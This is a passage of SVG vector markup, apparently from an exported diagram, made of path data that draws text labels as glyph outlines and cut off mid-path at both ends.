-1.328125 2.890625 -1.328125q1.078125 0 1.859375 0.421875q0.796875 0.421875 1.140625 1.171875q0.34375 0.75 0.34375 2.171875l0 6.125l-1.640625 0l0 -6.125q0 -1.234375 -0.53125 -1.796875q-0.53125 -0.5625 -1.515625 -0.5625q-0.71875 0 -1.359375 0.390625q-0.640625 0.375 -0.921875 1.015625q-0.265625 0.640625 -0.265625 1.78125l0 5.296875l-1.640625 0zm16.688232 -1.1875q-0.921875 0.765625 -1.765625 1.09375q-0.828125 0.3125 -1.796875 0.3125q-1.59375 0 -2.453125 -0.78125q-0.859375 -0.78125 -0.859375 -1.984375q0 -0.71875 0.328125 -1.296875q0.328125 -0.59375 0.84375 -0.9375q0.53125 -0.359375 1.1875 -0.546875q0.46875 -0.125 1.453125 -0.25q1.984375 -0.234375 2.921875 -0.5625q0.015625 -0.34375 0.015625 -0.421875q0 -1.0 -0.46875 -1.421875q-0.625 -0.546875 -1.875 -0.546875q-1.15625 0 -1.703125 0.40625q-0.546875 0.40625 -0.8125 1.421875l-1.609375 -0.21875q0.21875 -1.015625 0.71875 -1.640625q0.5 -0.640625 1.453125 -0.984375q0.953125 -0.34375 2.1875 -0.34375q1.25 0 2.015625 0.296875q0.78125 0.28125 1.140625 0.734375q0.375 0.4375 0.515625 1.109375q0.078125 0.421875 0.078125 1.515625l0 2.1875q0 2.28125 0.109375 2.890625q0.109375 0.59375 0.40625 1.15625l-1.703125 0q-0.265625 -0.515625 -0.328125 -1.1875zm-0.140625 -3.671875q-0.890625 0.375 -2.671875 0.625q-1.015625 0.140625 -1.4375 0.328125q-0.421875 0.1875 -0.65625 0.53125q-0.21875 0.34375 -0.21875 0.78125q0 0.65625 0.5 1.09375q0.5 0.4375 1.453125 0.4375q0.9375 0 1.671875 -0.40625q0.75 -0.421875 1.09375 -1.140625q0.265625 -0.5625 0.265625 -1.640625l0 -0.609375zm4.203827 -6.609375l0 -1.890625l1.640625 0l0 1.890625l-1.640625 0zm0 11.46875l0 -9.671875l1.640625 0l0 9.671875l-1.640625 0zm4.1448364 0l0 -9.671875l1.46875 0l0 1.375q1.0625 -1.59375 3.078125 -1.59375q0.875 0 1.609375 0.3125q0.734375 0.3125 1.09375 0.828125q0.375 0.5 0.515625 1.203125q0.09375 0.453125 0.09375 1.59375l0 5.953125l-1.640625 0l0 -5.890625q0 -1.0 -0.203125 -1.484375q-0.1875 -0.5 -0.671875 -0.796875q-0.484375 -0.296875 -1.140625 -0.296875q-1.046875 0 -1.8125 0.671875q-0.75 0.65625 -0.75 2.515625l0 5.28125l-1.640625 0zm13.500702 3.921875q-1.359375 -1.703125 -2.296875 -4.0q-0.9375 -2.296875 -0.9375 -4.765625q0 -2.15625 0.703125 -4.140625q0.828125 -2.3125 2.53125 -4.59375l1.171875 0q-1.09375 1.890625 -1.453125 2.703125q-0.546875 1.25 -0.875 2.625q-0.390625 1.703125 -0.390625 3.421875q0 4.375 2.71875 8.75l-1.171875 0zm4.165802 0l-1.1875 0q2.734375 -4.375 2.734375 -8.75q0 -1.71875 -0.390625 -3.390625q-0.3125 -1.375 -0.875 -2.625q-0.359375 -0.828125 -1.46875 -2.734375l1.1875 0q1.703125 2.28125 2.53125 4.59375q0.6875 1.984375 0.6875 4.140625q0 2.46875 -0.9375 4.765625q-0.9375 2.296875 -2.28125 4.0z" fill-rule="nonzero"/>&lt;path fill="#000000" d="m176.06902 630.0373l0 -13.375l1.484375 0l0 1.25q0.53125 -0.734375 1.1875 -1.09375q0.671875 -0.375 1.625 -0.375q1.234375 0 2.171875 0.640625q0.953125 0.625 1.4375 1.796875q0.484375 1.15625 0.484375 2.546875q0 1.484375 -0.53125 2.671875q-0.53125 1.1875 -1.546875 1.828125q-1.015625 0.625 -2.140625 0.625q-0.8125 0 -1.46875 -0.34375q-0.65625 -0.34375 -1.0625 -0.875l0 4.703125l-1.640625 0zm1.484375 -8.484375q0 1.859375 0.75 2.765625q0.765625 0.890625 1.828125 0.890625q1.09375 0 1.875 -0.921875q0.78125 -0.9375 0.78125 -2.875q0 -1.84375 -0.765625 -2.765625q-0.75 -0.921875 -1.8125 -0.921875q-1.046875 0 -1.859375 0.984375q-0.796875 0.96875 -0.796875 2.84375zm8.875717 4.78125l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm5.618927 -4.84375q0 -2.6875 1.484375 -3.96875q1.25 -1.078125 3.046875 -1.078125q2.0 0 3.265625 1.3125q1.265625 1.296875 1.265625 3.609375q0 1.859375 -0.5625 2.9375q-0.5625 1.0625 -1.640625 1.65625q-1.0625 0.59375 -2.328125 0.59375q-2.03125 0 -3.28125 -1.296875q-1.25 -1.3125 -1.25 -3.765625zm1.6875 0q0 1.859375 0.796875 2.796875q0.8125 0.921875 2.046875 0.921875q1.21875 0 2.03125 -0.921875q0.8125 -0.9375 0.8125 -2.84375q0 -1.796875 -0.8125 -2.71875q-0.8125 -0.921875 -2.03125 -0.921875q-1.234375 0 -2.046875 0.921875q-0.796875 0.90625 -0.796875 2.765625zm15.610092 1.296875l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm9.640625 0.4375l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm8.485092 2.875l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm9.328125 0l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm8.46875 6.59375l0 -1.1875l10.859375 0l0 1.1875l-10.859375 0zm15.469467 -5.171875l0.234375 1.453125q-0.6875 0.140625 -1.234375 0.140625q-0.890625 0 -1.390625 -0.28125q-0.484375 -0.28125 -0.6875 -0.734375q-0.203125 -0.46875 -0.203125 -1.9375l0 -5.578125l-1.203125 0l0 -1.265625l1.203125 0l0 -2.390625l1.625 -0.984375l0 3.375l1.65625 0l0 1.265625l-1.65625 0l0 5.671875q0 0.6875 0.078125 0.890625q0.09375 0.203125 0.28125 0.328125q0.203125 0.109375 0.578125 0.109375q0.265625 0 0.71875 -0.0625zm1.5895538 1.46875l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm12.540802 -1.1875q-0.921875 0.765625 -1.765625 1.09375q-0.828125 0.3125 -1.796875 0.3125q-1.59375 0 -2.453125 -0.78125q-0.859375 -0.78125 -0.859375 -1.984375q0 -0.71875 0.328125 -1.296875q0.328125 -0.59375 0.84375 -0.9375q0.53125 -0.359375 1.1875 -0.546875q0.46875 -0.125 1.453125 -0.25q1.984375 -0.234375 2.921875 -0.5625q0.015625 -0.34375 0.015625 -0.421875q0 -1.0 -0.46875 -1.421875q-0.625 -0.546875 -1.875 -0.546875q-1.15625 0 -1.703125 0.40625q-0.546875 0.40625 -0.8125 1.421875l-1.609375 -0.21875q0.21875 -1.015625 0.71875 -1.640625q0.5 -0.640625 1.453125 -0.984375q0.953125 -0.34375 2.1875 -0.34375q1.25 0 2.015625 0.296875q0.78125 0.28125 1.140625 0.734375q0.375 0.4375 0.515625 1.109375q0.078125 0.421875 0.078125 1.515625l0 2.1875q0 2.28125 0.109375 2.890625q0.109375 0.59375 0.40625 1.15625l-1.703125 0q-0.265625 -0.515625 -0.328125 -1.1875zm-0.140625 -3.671875q-0.890625 0.375 -2.671875 0.625q-1.015625 0.140625 -1.4375 0.328125q-0.421875 0.1875 -0.65625 0.53125q-0.21875 0.34375 -0.21875 0.78125q0 0.65625 0.5 1.09375q0.5 0.4375 1.453125 0.4375q0.9375 0 1.671875 -0.40625q0.75 -0.421875 1.09375 -1.140625q0.265625 -0.5625 0.265625 -1.640625l0 -0.609375zm10.516357 1.3125l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm3.015625 3.546875l0 -13.359375l1.640625 0l0 7.625l3.890625 -3.9375l2.109375 0l-3.6875 3.59375l4.0625 6.078125l-2.015625 0l-3.203125 -4.953125l-1.15625 1.125l0 3.828125l-1.640625 0zm15.953125 -3.109375l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm9.125702 5.765625l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm4.712677 3.703125l0 -1.1875l10.859375 0l0 1.1875l-10.859375 0zm18.203857 -7.25l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm3.015625 3.546875l0 -13.359375l1.640625 0l0 4.796875q1.140625 -1.328125 2.890625 -1.328125q1.078125 0 1.859375 0.421875q0.796875 0.421875 1.140625 1.171875q0.34375 0.75 0.34375 2.171875l0 6.125l-1.640625 0l0 -6.125q0 -1.234375 -0.53125 -1.796875q-0.53125 -0.5625 -1.515625 -0.5625q-0.71875 0 -1.359375 0.390625q-0.640625 0.375 -0.921875 1.015625q-0.265625 0.640625 -0.265625 1.78125l0 5.296875l-1.640625 0zm10.375702 -11.46875l0 -1.890625l1.640625 0l0 1.890625l-1.640625 0zm0 11.46875l0 -9.671875l1.640625 0l0 9.671875l-1.640625 0zm4.0979614 0l0 -13.359375l1.640625 0l0 13.359375l-1.640625 0zm10.457306 0l0 -1.21875q-0.90625 1.4375 -2.703125 1.4375q-1.15625 0 -2.125 -0.640625q-0.96875 -0.640625 -1.5 -1.78125q-0.53125 -1.140625 -0.53125 -2.625q0 -1.453125 0.484375 -2.625q0.484375 -1.1875 1.4375 -1.8125q0.96875 -0.625 2.171875 -0.625q0.875 0 1.546875 0.375q0.6875 0.359375 1.109375 0.953125l0 -4.796875l1.640625 0l0 13.359375l-1.53125 0zm-5.171875 -4.828125q0 1.859375 0.78125 2.78125q0.78125 0.921875 1.84375 0.921875q1.078125 0 1.828125 -0.875q0.75 -0.890625 0.75 -2.6875q0 -1.984375 -0.765625 -2.90625q-0.765625 -0.9375 -1.890625 -0.9375q-1.078125 0 -1.8125 0.890625q-0.734375 0.890625 -0.734375 2.8125zm9.266357 4.828125l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm12.853302 -3.109375l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm9.141327 5.765625l0 -9.671875l1.46875 0l0 1.375q1.0625 -1.59375 3.078125 -1.59375q0.875 0 1.609375 0.3125q0.734375 0.3125 1.09375 0.828125q0.375 0.5 0.515625 1.203125q0.09375 0.453125 0.09375 1.59375l0 5.953125l-1.640625 0l0 -5.890625q0 -1.0 -0.203125 -1.484375q-0.1875 -0.5 -0.671875 -0.796875q-0.484375 -0.296875 -1.140625 -0.296875q-1.046875 0 -1.8125 0.671875q-0.75 0.65625 -0.75 2.515625l0 5.28125l-1.640625 0zm13.500732 3.921875q-1.359375 -1.703125 -2.296875 -4.0q-0.9375 -2.296875 -0.9375 -4.765625q0 -2.15625 0.703125 -4.140625q0.828125 -2.3125 2.53125 -4.59375l1.171875 0q-1.09375 1.890625 -1.453125 2.703125q-0.546875 1.25 -0.875 2.625q-0.390625 1.703125 -0.390625 3.421875q0 4.375 2.71875 8.75l-1.171875 0zm4.165802 0l-1.1875 0q2.734375 -4.375 2.734375 -8.75q0 -1.71875 -0.390625 -3.390625q-0.3125 -1.375 -0.875 -2.625q-0.359375 -0.828125 -1.46875 -2.734375l1.1875 0q1.703125 2.28125 2.53125 4.59375q0.6875 1.984375 0.6875 4.140625q0 2.46875 -0.9375 4.765625q-0.9375 2.296875 -2.28125 4.0z" fill-rule="nonzero"/>&lt;path fill="#000000" d="m176.06902 652.4373l0 -13.375l1.484375 0l0 1.25q0.53125 -0.734375 1.1875 -1.09375q0.671875 -0.375 1.625 -0.375q1.234375 0 2.171875 0.640625q0.953125 0.625 1.4375 1.796875q0.484375 1.15625 0.484375 2.546875q0 1.484375 -0.53125 2.671875q-0.53125 1.1875 -1.546875 1.828125q-1.015625 0.625 -2.140625 0.625q-0.8125 0 -1.46875 -0.34375q-0.65625 -0.34375 -1.0625 -0.875l0 4.703125l-1.640625 0zm1.484375 -8.484375q0 1.859375 0.75 2.765625q0.765625 0.890625 1.828125 0.890625q1.09375 0 1.875 -0.921875q0.78125 -0.9375 0.78125 -2.875q0 -1.84375 -0.765625 -2.765625q-0.75 -0.921875 -1.8125 -0.921875q-1.046875 0 -1.859375 0.984375q-0.796875 0.96875 -0.796875 2.84375zm8.875717 4.78125l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm5.618927 -4.84375q0 -2.6875 1.484375 -3.96875q1.25 -1.078125 3.046875 -1.078125q2.0 0 3.265625 1.3125q1.265625 1.296875 1.265625 3.609375q0 1.859375 -0.5625 2.9375q-0.5625 1.0625 -1.640625 1.65625q-1.0625 0.59375 -2.328125 0.59375q-2.03125 0 -3.28125 -1.296875q-1.25 -1.3125 -1.25 -3.765625zm1.6875 0q0 1.859375 0.796875 2.796875q0.8125 0.921875 2.046875 0.921875q1.21875 0 2.03125 -0.921875q0.8125 -0.9375 0.8125 -2.84375q0 -1.796875 -0.8125 -2.71875q-0.8125 -0.921875 -2.03125 -0.921875q-1.234375 0 -2.046875 0.921875q-0.796875 0.90625 -0.796875 2.765625zm15.610092 1.296875l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm9.640625 0.4375l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm8.485092 2.875l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm9.328125 0l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm8.46875 6.59375l0 -1.1875l10.859375 0l0 1.1875l-10.859375 0zm15.469467 -5.171875l0.234375 1.453125q-0.6875 0.140625 -1.234375 0.140625q-0.890625 0 -1.390625 -0.28125q-0.484375 -0.28125 -0.6875 -0.734375q-0.203125 -0.46875 -0.203125 -1.9375l0 -5.578125l-1.203125 0l0 -1.265625l1.203125 0l0 -2.390625l1.625 -0.984375l0 3.375l1.65625 0l0 1.265625l-1.65625 0l0 5.671875q0 0.6875 0.078125 0.890625q0.09375 0.203125 0.28125 0.328125q0.203125 0.109375 0.578125 0.109375q0.265625 0 0.71875 -0.0625zm1.5895538 1.46875l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm12.540802 -1.1875q-0.921875 0.765625 -1.765625 1.09375q-0.828125 0.3125 -1.796875 0.3125q-1.59375 0 -2.453125 -0.78125q-0.859375 -0.78125 -0.859375 -1.984375q0 -0.71875 0.328125 -1.296875q0.328125 -0.59375 0.84375 -0.9375q0.53125 -0.359375 1.1875 -0.546875q0.46875 -0.125 1.453125 -0.25q1.984375 -0.234375 2.921875 -0.5625q0.015625 -0.34375 0.015625 -0.421875q0 -1.0 -0.46875 -1.421875q-0.625 -0.546875 -1.875 -0.546875q-1.15625 0 -1.703125 0.40625q-0.546875 0.40625 -0.8125 1.421875l-1.609375 -0.21875q0.21875 -1.015625 0.71875 -1.640625q0.5 -0.640625 1.453125 -0.984375q0.953125 -0.34375 2.1875 -0.34375q1.25 0 2.015625 0.296875q0.78125 0.28125 1.140625 0.734375q0.375 0.4375 0.515625 1.109375q0.078125 0.421875 0.078125 1.515625l0 2.1875q0 2.28125 0.109375 2.890625q0.109375 0.59375 0.40625 1.15625l-1.703125 0q-0.265625 -0.515625 -0.328125 -1.1875zm-0.140625 -3.671875q-0.890625 0.375 -2.671875 0.625q-1.015625 0.140625 -1.4375 0.328125q-0.421875 0.1875 -0.65625 0.53125q-0.21875 0.34375 -0.21875 0.78125q0 0.65625 0.5 1.09375q0.5 0.4375 1.453125 0.4375q0.9375 0 1.671875 -0.40625q0.75 -0.421875 1.09375 -1.140625q0.265625 -0.5625 0.265625 -1.640625l0 -0.609375zm10.516357 1.3125l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm3.015625 3.546875l0 -13.359375l1.640625 0l0 7.625l3.890625 -3.9375l2.109375 0l-3.6875 3.59375l4.0625 6.078125l-2.015625 0l-3.203125 -4.953125l-1.15625 1.125l0 3.828125l-1.640625 0zm15.953125 -3.109375l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm9.125702 5.765625l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 